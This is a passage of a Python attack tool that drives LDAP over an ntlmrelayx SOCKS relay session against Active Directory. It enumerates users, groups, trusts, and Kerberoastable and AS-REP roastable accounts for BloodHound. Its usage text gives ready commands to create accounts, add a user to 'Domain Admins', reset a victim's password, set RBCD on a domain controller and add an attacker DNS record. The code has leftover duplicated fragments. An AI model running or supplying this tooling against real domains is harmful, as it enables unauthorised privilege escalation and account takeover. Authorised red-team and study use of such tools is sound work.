                   timeout=600, use_ldaps=False, ldap_channel_binding=False, ldap_signing=False):
    """
    Enumerate LDAP using ldap3 with NTLM authentication
    This mimics how Certipy connects and works with ntlmrelayx SOCKS

    Args:
        use_ldaps: Use LDAPS (LDAP over SSL/TLS)
        ldap_channel_binding: Enable LDAP channel binding (requires LDAPS)
        ldap_signing: Enable LDAP signing
    """

    # If enum_all, enable everything
    if enum_all:
        enum_users = enum_computers = enum_groups = True
        enum_trusts = enum_gpos = enum_ous = enum_containers = True
        enum_kerberoastable = enum_asreproast = enum_domain_info = True

    # Storage for BOFHound output
    bofhound_data = {
        "meta": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "dc": host,
            "tool": "ldap_ntlm_enum"
        },
        "data": {}
    }

    # Format username for NTLM: DOMAIN\username
    ntlm_user = f"{domain}\\{username}"

    # Validate options
    if ldap_channel_binding and not use_ldaps:
        print("[!] Warning: LDAP channel binding requires LDAPS. Enabling LDAPS...")
        use_ldaps = True

    scheme = "ldaps" if use_ldaps else "ldap"
    print(f"[*] Connecting to {scheme}://{host}:{port}")
    print(f"[*] Using NTLM authentication as: {ntlm_user}")
    print(f"[*] LDAP timeout: {timeout}s (use -t to adjust for slow SOCKS connections)")
    if use_ldaps:
        print(f"[*] LDAPS: Enabled")
        if ldap_channel_binding:
            print(f"[*] Channel binding: Enabled")
    if ldap_signing:
        print(f"[*] LDAP signing: Enabled")

    # Create server with optional SSL/TLS
    if use_ldaps:
        from ldap3 import Tls
        # Configure TLS for LDAPS (similar to Certipy)
        tls = Tls(
            validate=ssl.CERT_NONE,
            version=ssl.PROTOCOL_TLS_CLIENT,
            ciphers="ALL:@SECLEVEL=0",
        )
        server = Server(
            host,
            port=port,
            use_ssl=True,
            get_info=None,
            connect_timeout=30,
            tls=tls
        )
    else:
        server = Server(host, port=port, get_info=None, connect_timeout=30)

    # Create connection with NTLM authentication
    # Use ExtendedLdapConnection when channel binding or signing is enabled (like Certipy)
    # Otherwise use standard ldap3.Connection
    if ldap_channel_binding or ldap_signing:
        print(f"[*] Using ExtendedLdapConnection with custom NTLM bind (Certipy-style)")
        conn = ExtendedLdapConnection(
            server,
            user=ntlm_user,
            password=password,
            authentication=NTLM,
            auto_bind=False,
            auto_referrals=False,
            raise_exceptions=False,
            receive_timeout=timeout,
            return_empty_attributes=False,
            use_channel_binding=ldap_channel_binding,
            use_signing=ldap_signing,
            use_ssl=use_ldaps,
            target_domain=domain,
            target_user=username,
            target_password=password,
            target_nthash=""  # If needed, could be passed as parameter
        )

        # Bind using custom NTLM bind with channel binding/signing support
        print(f"[*] Performing custom NTLM bind...")
        try:
            result = conn.do_ntlm_bind()
            if result.get('result') != RESULT_SUCCESS:
                print(f"[-] Custom NTLM bind failed: {result}")
                return False
            print(f"[+] Custom NTLM bind successful")
        except Exception as e:
            print(f"[-] Custom NTLM bind error: {e}")
            return False
    else:
        # Standard ldap3 Connection for basic NTLM without channel binding/signing
        conn = Connection(
            server,
            user=ntlm_user,
            password=password,
            authentication=NTLM,
            auto_bind=False,
            auto_referrals=False,
            raise_exceptions=False,
            receive_timeout=timeout,
            return_empty_attributes=False
        )

        # Standard bind
        print(f"[*] Binding...")
        if not conn.bind():
            print(f"[-] Bind failed: {conn.result}")
            return False
    
    print(f"[+] Bind successful!")
    
    # Auto-detect base DN if not provided
    if not base_dn:
        print(f"\n[*] Base DN not provided, auto-detecting...")
        base_dn = get_base_dn(conn, domain)
        if not base_dn:
            print(f"[-] Could not determine base DN")
            return False
    else:
        print(f"[*] Using provided base DN: {base_dn}")
    
    # Get configuration path for some queries
    config_path = f"CN=Configuration,{base_dn}"
    
    # Domain Info
    if enum_domain_info:
        print(f"\n[*] Enumerating domain information...")
        domain_data = get_domain_info(conn, base_dn)
        if domain_data:
            bofhound_data["data"]["domain_info"] = domain_data
            print(f"[+] Domain Info:")
            for key, value in domain_data.items():
                print(f"    {key}: {value}")
    
    # Users
    if enum_users:
        print(f"\n[*] Enumerating users...")
        users = get_users(conn, base_dn)
        bofhound_data["data"]["users"] = users
        print(f"[+] Found {len(users)} users")
        display_users(users)
    
    # Computers
    if enum_computers:
        print(f"\n[*] Enumerating computers...")
        computers = get_computers(conn, base_dn)
        bofhound_data["data"]["computers"] = computers
        print(f"[+] Found {len(computers)} computers")
        display_computers(computers)
    
    # Groups
    if enum_groups:
        print(f"\n[*] Enumerating groups...")
        groups = get_groups(conn, base_dn)
        bofhound_data["data"]["groups"] = groups
        print(f"[+] Found {len(groups)} groups")
        display_groups(groups)
    
    # Trusts
    if enum_trusts:
        print(f"\n[*] Enumerating trusts...")
        trusts = get_trusts(conn, base_dn)
        bofhound_data["data"]["trusts"] = trusts
        print(f"[+] Found {len(trusts)} trusts")
        display_trusts(trusts)
    
    # GPOs
    if enum_gpos:
        print(f"\n[*] Enumerating GPOs...")
        gpos = get_gpos(conn, base_dn)
        bofhound_data["data"]["gpos"] = gpos
        print(f"[+] Found {len(gpos)} GPOs")
    
    # OUs
    if enum_ous:
        print(f"\n[*] Enumerating OUs...")
        ous = get_ous(conn, base_dn)
        bofhound_data["data"]["ous"] = ous
        print(f"[+] Found {len(ous)} OUs")
    
    # Containers
    if enum_containers:
        print(f"\n[*] Enumerating containers...")
        containers = get_containers(conn, base_dn)
        bofhound_data["data"]["containers"] = containers
        print(f"[+] Found {len(containers)} containers")
    
    # Kerberoastable
    if enum_kerberoastable:
        print(f"\n[*] Enumerating Kerberoastable accounts...")
        kerberoastable = get_kerberoastable(conn, base_dn)
        bofhound_data["data"]["kerberoastable"] = kerberoastable
        print(f"[+] Found {len(kerberoastable)} Kerberoastable accounts")
        display_kerberoastable(kerberoastable)
    
    # AS-REP Roastable
    if enum_asreproast:
        print(f"\n[*] Enumerating AS-REP roastable accounts...")
        asreproastable = get_asreproastable(conn, base_dn)
        bofhound_data["data"]["asreproastable"] = asreproastable
        print(f"[+] Found {len(asreproastable)} AS-REP roastable accounts")
        display_asreproastable(asreproastable)
    
    conn.unbind()
    
    # Save output
    if output_dir:
        save_output(bofhound_data, output_dir, domain, output_format=output_format)
    
    return True
    """
    Enumerate LDAP using ldap3 with NTLM authentication
    This mimics how Certipy connects
    """
    
    # Format username for NTLM: DOMAIN\username
    ntlm_user = f"{domain}\\{username}"
    
    print(f"[*] Connecting to {host}:{port}")
    print(f"[*] Using NTLM authentication as: {ntlm_user}")
    
    # Create server (no SSL, no server info gathering)
    server = Server(host, port=port, get_info=None, connect_timeout=30)
    
    # Create connection with NTLM authentication
    # Use default SYNC strategy (like Certipy) - RESTARTABLE doesn't work with SOCKS
    conn = Connection(
        server,
        user=ntlm_user,
        password=password,
        authentication=NTLM,
        # No client_strategy - uses SYNC by default like Certipy
        auto_bind=False,
        auto_referrals=False,  # Certipy uses this
        raise_exceptions=False,
        receive_timeout=timeout,  # Configurable timeout for SOCKS (default 600s)
        return_empty_attributes=False
    )
    
    # Bind
    print(f"[*] Binding...")
    if not conn.bind():
        print(f"[-] Bind failed: {conn.result}")
        return False
    
    print(f"[+] Bind successful!")
    print(f"    Result: {conn.result}")
    
    # Auto-detect base DN if not provided
    if not base_dn:
        print(f"\n[*] Base DN not provided, auto-detecting...")
        base_dn = get_base_dn(conn, domain)
        if not base_dn:
            print(f"[-] Could not determine base DN")
            return False
    else:
        print(f"[*] Using provided base DN: {base_dn}")
    
def main():
    parser = argparse.ArgumentParser(
        description='LDAP Enumeration and Modification via ntlmrelayx SOCKS (BOFHound compatible)',
        epilog='''
Enumeration Examples:
  # Full enumeration (all queries)
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all -o /tmp/output

  # Specific queries
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --users --computers
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --kerberoastable
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --asreproast

  # With LDAPS (SSL/TLS) and channel binding
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldaps --ldap-channel-binding

  # With LDAP signing
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u jdoe --all --ldap-signing

Modification Examples:
  # Add new user
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-user newuser --add-user-pass 'P@ssw0rd!'

  # Add new computer
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-computer EVIL01 --add-computer-pass 'P@ssw0rd!'

  # Add user to group
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-user-to-group newuser "Domain Admins"

  # Set/reset password
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --set-password victim 'NewP@ss123!'

  # Set RBCD (Resource-Based Constrained Delegation)
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --set-rbcd DC01 EVIL01$

  # Add DNS A record
  proxychains python3 %(prog)s -H 10.10.10.10 -d CONTOSO -u admin --add-dns attacker 10.10.10.50
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Connection options
    parser.add_argument('-H', '--host', required=True, help='LDAP server IP')
    parser.add_argument('-p', '--port', type=int, default=389, help='LDAP port (default: 389)')
    parser.add_argument('-d', '--domain', required=True, help='Domain name (e.g., CONTOSO or contoso.local)')
    parser.add_argument('-u', '--username', required=True, help='Username (from ntlmrelayx SOCKS session)')
    parser.add_argument('-P', '--password', default='dummy', help='Password (default: dummy - ignored by SOCKS)')
    parser.add_argument('-b', '--base-dn', help='Base DN (auto-detected if not provided)')
    parser.add_argument('-t', '--timeout', type=int, default=600,
                       help='LDAP receive timeout in seconds (default: 600 for SOCKS)')

    # LDAP Security options
    security_group = parser.add_argument_group('LDAP security options')
    security_group.add_argument('--ldaps', action='store_true',
                               help='Use LDAPS (LDAP over SSL/TLS) on port 636')
    security_group.add_argument('--ldap-channel-binding', action='store_true', default=False,
                               help='Enable LDAP channel binding (requires LDAPS)')
    security_group.add_argument('--no-ldap-channel-binding', dest='ldap_channel_binding', action='store_false',
                               help='Disable LDAP channel binding (default)')
    security_group.add_argument('--ldap-signing', action='store_true', default=False,
                               help='Enable LDAP signing')
    security_group.add_argument('--no-ldap-signing', dest='ldap_signing', action='store_false',
                               help='Disable LDAP signing (default)')

    # Output options
    parser.add_argument('-o', '--output', help='Output directory for results')
    
    # Output format options (mutually exclusive)
    format_group = parser.add_mutually_exclusive_group()
    format_group.add_argument('--bloodhound-ce', action='store_true', 
                             help='Output in BloodHound CE v5 format')
    format_group.add_argument('--bofhound', action='store_true',
                             help='Output in BOFHound format (single JSON file)')
    # Default is BloodHound Legacy v4 format
    
    # Enumeration options
    enum_group = parser.add_argument_group('enumeration options')
    enum_group.add_argument('--all', action='store_true', help='Enumerate everything (default if no options specified)')
    enum_group.add_argument('--domain-info', action='store_true', help='Get domain info (functional level, MAQ, password policy)')
    enum_group.add_argument('--users', action='store_true', help='Enumerate all users')
    enum_group.add_argument('--computers', action='store_true', help='Enumerate all computers')
    enum_group.add_argument('--groups', action='store_true', help='Enumerate all groups')
    enum_group.add_argument('--trusts', action='store_true', help='Enumerate domain trusts')
    enum_group.add_argument('--gpos', action='store_true', help='Enumerate GPOs')
    enum_group.add_argument('--ous', action='store_true', help='Enumerate OUs')
    enum_group.add_argument('--containers', action='store_true', help='Enumerate containers')
    enum_group.add_argument('--kerberoastable', action='store_true', help='Find Kerberoastable accounts (users with SPN)')
    enum_group.add_argument('--asreproast', action='store_true', help='Find AS-REP roastable accounts (no pre-auth)')

    # Custom query options
    custom_group = parser.add_argument_group('custom LDAP query options')
    custom_group.add_argument('--custom-query', metavar='FILTER',
                             help='Execute custom LDAP query with specified filter (e.g., "(objectClass=user)")')
    custom_group.add_argument('--custom-attrs', metavar='ATTRS',
                             help='Comma-separated list of attributes for custom query (default: all attributes)')
    custom_group.add_argument('--custom-base', metavar='BASE_DN',
                             help='Custom base DN for query (default: domain base DN)')
    custom_group.add_argument('--custom-scope', choices=['BASE', 'LEVEL', 'SUBTREE'], default='SUBTREE',
                             help='Search scope for custom query (default: SUBTREE)')

    # LDAP modification operations
    mod_group = parser.add_argument_group('LDAP modification operations')
    mod_group.add_argument('--add-user', metavar='USERNAME', help='Add a new user')
    mod_group.add_argument('--add-user-pass', metavar='PASSWORD', help='Password for new user (use with --add-user)')
    mod_group.add_argument('--add-user-ou', metavar='OU_DN', help='OU for new user (default: CN=Users,DC=...)')
    mod_group.add_argument('--add-computer', metavar='HOSTNAME', help='Add a new computer account')
    mod_group.add_argument('--add-computer-pass', metavar='PASSWORD', help='Password for new computer (use with --add-computer)')
    mod_group.add_argument('--add-computer-ou', metavar='OU_DN', help='OU for new computer (default: CN=Computers,DC=...)')
    mod_group.add_argument('--add-user-to-group', nargs=2, metavar=('USER', 'GROUP'),
                          help='Add user to group (e.g., --add-user-to-group jdoe "Domain Admins")')
    mod_group.add_argument('--set-password', nargs=2, metavar=('USER', 'PASSWORD'),
                          help='Set/reset user password (e.g., --set-password jdoe NewPass123!)')
    mod_group.add_argument('--set-rbcd', nargs=2, metavar=('TARGET', 'SERVICE'),
                          help='Set RBCD delegation (e.g., --set-rbcd DC01 ATTACKER$)')
    mod_group.add_argument('--add-dns', nargs=2, metavar=('NAME', 'IP'),
                          help='Add DNS A record (e.g., --add-dns attacker 10.10.10.50)')
    mod_group.add_argument('--dns-zone', metavar='ZONE', help='DNS zone (default: domain zone)')

    args = parser.parse_args()

    # Check if any modification operation is requested
    is_modification = any([
        args.add_user, args.add_computer, args.add_user_to_group,
        args.set_password, args.set_rbcd, args.add_dns
    ])

    # Check if custom query is requested
    is_custom_query = bool(args.custom_query)

    # If no enumeration options specified and no modification and no custom query, default to --all
    if not is_modification and not is_custom_query and not any([args.all, args.domain_info, args.users, args.computers, args.groups,
                args.trusts, args.gpos, args.ous, args.containers,
                args.kerberoastable, args.asreproast]):
        args.all = True
    
    # Determine output format
    if args.bloodhound_ce:
        output_format = 'ce'
    elif args.bofhound:
        output_format = 'bofhound'
    else:
        output_format = 'legacy'  # Default: BloodHound Legacy v5

    # Auto-adjust port for LDAPS if not explicitly set
    port = args.port
    if args.ldaps and args.port == 389:
        port = 636
        print(f"[*] LDAPS enabled, using default port 636")

    print("=" * 70)
    if is_modification:
        print("LDAP Modification via ntlmrelayx SOCKS (ldap3 + NTLM)")
    else:
        print("LDAP Enumeration via ntlmrelayx SOCKS (ldap3 + NTLM)")
    print("=" * 70)
    print()
    print("NOTE: This script works with ntlmrelayx SOCKS proxy when other")
    print("      tools fail. Uses Certipy's LDAP connection method.")
    print()

    if not is_modification:
        if output_format == 'legacy':
            print(f"[*] Output format: BloodHound Legacy v5 (compatible with bloodhound.py)")
        elif output_format == 'ce':
            print(f"[*] Output format: BloodHound CE v6")
        elif output_format == 'bofhound':
            print(f"[*] Output format: BOFHound")
        print()

    # Handle LDAP modification operations
    if is_modification:
        try:
            # Format username for NTLM: DOMAIN\username
            ntlm_user = f"{args.domain}\\{args.username}"

            # Validate LDAP security options for modifications
            if args.ldap_channel_binding and not args.ldaps:
                print("[!] Warning: LDAP channel binding requires LDAPS. Enabling LDAPS...")
                args.ldaps = True

            scheme = "ldaps" if args.ldaps else "ldap"
            print(f"[*] Connecting to {scheme}://{args.host}:{port}")
            print(f"[*] Using NTLM authentication as: {ntlm_user}")

            # Create server
            if args.ldaps:
                from ldap3 import Tls
                tls = Tls(
                    validate=ssl.CERT_NONE,
                    version=ssl.PROTOCOL_TLS_CLIENT,
                    ciphers="ALL:@SECLEVEL=0",
                )
                server = Server(
                    args.host,
                    port=port,
                    use_ssl=True,
                    get_info=None,
                    connect_timeout=30,
                    tls=tls
                )
            else:
                server = Server(args.host, port=port, get_info=None, connect_timeout=30)

            # Create connection
            if args.ldap_channel_binding or args.ldap_signing:
                print(f"[*] Using ExtendedLdapConnection with custom NTLM bind")
                conn = ExtendedLdapConnection(
                    server,
                    user=ntlm_user,
                    password=args.password,
                    authentication=NTLM,
                    auto_bind=False,
                    auto_referrals=False,
                    raise_exceptions=False,
                    receive_timeout=args.timeout,
                    return_empty_attributes=False,
                    use_channel_binding=args.ldap_channel_binding,
                    use_signing=args.ldap_signing,
                    use_ssl=args.ldaps,
                    target_domain=args.domain,
                    target_user=args.username,
                    target_password=args.password,
                    target_nthash=""
                )
                print(f"[*] Performing custom NTLM bind...")
                result = conn.do_ntlm_bind()
                if result.get('result') != RESULT_SUCCESS:
                    print(f"[-] Custom NTLM bind failed: {result}")
                    return
                print(f"[+] Custom NTLM bind successful")
            else:
                conn = Connection(
                    server,
                    user=ntlm_user,
                    password=args.password,
                    authentication=NTLM,
                    auto_bind=False,
                    auto_referrals=False,
                    raise_exceptions=False,
                    receive_timeout=args.timeout,
                    return_empty_attributes=False
                )
                print(f"[*] Binding...")
                if not conn.bind():
                    print(f"[-] Bind failed: {conn.result}")
                    return
                print(f"[+] Bind successful")

            # Determine base DN if not provided
            if not args.base_dn:
                base_dn = ','.join([f'DC={part}' for part in args.domain.split('.')])
            else:
                base_dn = args.base_dn

            print(f"[*] Base DN: {base_dn}")
            print()

            # Get domain name for operations that need it
            domain_name = args.domain if '.' in args.domain else f"{args.domain}.local"

            # Execute modification operations
            if args.add_user:
                if not args.add_user_pass:
                    print("[-] Error: --add-user requires --add-user-pass")
                else:
                    add_user(conn, args.add_user, args.add_user_pass, args.add_user_ou, base_dn)

            if args.add_computer:
                if not args.add_computer_pass:
                    print("[-] Error: --add-computer requires --add-computer-pass")
                else:
                    add_computer(conn, args.add_computer, args.add_computer_pass,
                               args.add_computer_ou, base_dn, domain_name)

            if args.add_user_to_group:
                user, group = args.add_user_to_group
                add_user_to_group(conn, user, group, base_dn)

            if args.set_password:
                user, password = args.set_password
                set_password(conn, user, password, base_dn)

            if args.set_rbcd:
                target, service = args.set_rbcd
                set_rbcd(conn, target, service, base_dn)

            if args.add_dns:
                name, ip = args.add_dns
                add_dns_record(conn, name, ip, args.dns_zone, base_dn, domain_name)

            conn.unbind()
            print()
            print("[+] Modification operations completed")
            return

        except Exception as e:
            print(f"[-] Error during modification: {e}")
            import traceback
            traceback.print_exc()
            return

    # Handle custom LDAP query
    if is_custom_query:
        try:
            # Format username for NTLM: DOMAIN\username
            ntlm_user = f"{args.domain}\\{args.username}"

            scheme = "ldaps" if args.ldaps else "ldap"
            print(f"[*] Connecting to {scheme}://{args.host}:{port}")
            print(f"[*] Using NTLM authentication as: {ntlm_user}")

            # Create server
            if args.ldaps:
                from ldap3 import Tls
                tls = Tls(
                    validate=ssl.CERT_NONE,
                    version=ssl.PROTOCOL_TLS_CLIENT,
                    ciphers="ALL:@SECLEVEL=0",
                )
                server = Server(
                    args.host,
                    port=port,
                    use_ssl=True,
                    get_info=None,
                    connect_timeout=30,
                    tls=tls
                )
            else:
                server = Server(
                    args.host,
                    port=port,
                    use_ssl=False,
                    get_info=None,
                    connect_timeout=30
                )

            # Create connection with NTLM
            conn = Connection(
                server,
                user=ntlm_user,
                password=args.password,
                authentication='NTLM',
                receive_timeout=args.timeout,
                auto_bind=False,
                raise_exceptions=True,
                channel_binding=args.ldap_channel_binding if args.ldaps else False,
                session_security='ENCRYPT' if args.ldap_signing else None
            )

            print(f"[*] Binding to LDAP...")
            conn.bind()

            if not conn.bound:
                print("[-] Failed to bind to LDAP")
                return

            print("[+] Successfully bound to LDAP server")

            # Get or construct base DN
            if args.custom_base:
                base_dn = args.custom_base
            elif args.base_dn:
                base_dn = args.base_dn
            else:
                base_dn = get_base_dn(conn, args.domain)

            if not base_dn:
                print("[-] Could not determine base DN. Use --base-dn or --custom-base to specify.")
                conn.unbind()
                return

            # Parse attributes if provided
            attributes = None
            if args.custom_attrs:
                attributes = [attr.strip() for attr in args.custom_attrs.split(',')]

            # Parse search scope
            scope_map = {
                'BASE': BASE,
                'LEVEL': LEVEL,
                'SUBTREE': SUBTREE
            }
            search_scope = scope_map.get(args.custom_scope, SUBTREE)

            # Execute custom query
            results = custom_ldap_query(
                conn,
                base_dn,
                args.custom_query,
                attributes=attributes,
                search_scope=search_scope
            )

            # Display results
            display_custom_query(results)

            # Save results if output directory specified
            if args.output:
                import json
                from pathlib import Path
                from datetime import datetime, timezone

                output_path = Path(args.output)
                output_path.mkdir(parents=True, exist_ok=True)

                timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
                filename = f"custom_query_{timestamp}.json"
                filepath = output_path / filename

                # Convert results to JSON-serializable format
                json_results = []
                for entry in results:
                    json_entry = {}
                    for key, val in entry.items():
                        if isinstance(val, bytes):
                            json_entry[key] = f"<binary: {len(val)} bytes>"
                        elif isinstance(val, list):
                            json_entry[key] = [str(v) for v in val]
                        else:
                            json_entry[key] = str(val)
                    json_results.append(json_entry)

                with open(filepath, 'w') as f:
                    json.dump({
                        'query_filter': args.custom_query,
                        'base_dn': base_dn,
                        'scope': args.custom_scope,
                        'attributes': attributes or ['*'],
                        'results': json_results
                    }, f, indent=2)

                print(f"\n[+] Results saved to: {filepath}")

            conn.unbind()
            print()
            print("[+] Custom query completed")
            return

        except Exception as e:
            print(f"[-] Error during custom query: {e}")
            import traceback
            traceback.print_exc()
            return

    # Handle enumeration operations
    try:
        enumerate_ldap(
            host=args.host,
            port=port,
            domain=args.domain,
            username=args.username,
            password=args.password,
            base_dn=args.base_dn,
            output_dir=args.output,
            enum_users=args.users,
            enum_computers=args.computers,
            enum_groups=args.groups,
            enum_trusts=args.trusts,
            enum_gpos=args.gpos,
            enum_ous=args.ous,
            enum_containers=args.containers,
            enum_kerberoastable=args.kerberoastable,
            enum_asreproast=args.asreproast,
            enum_domain_info=args.domain_info,
            enum_all=args.all,
            output_format=output_format,
            timeout=args.timeout,
            use_ldaps=args.ldaps,
            ldap_channel_binding=args.ldap_channel_binding,
            ldap_signing=args.ldap_signing
        )
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
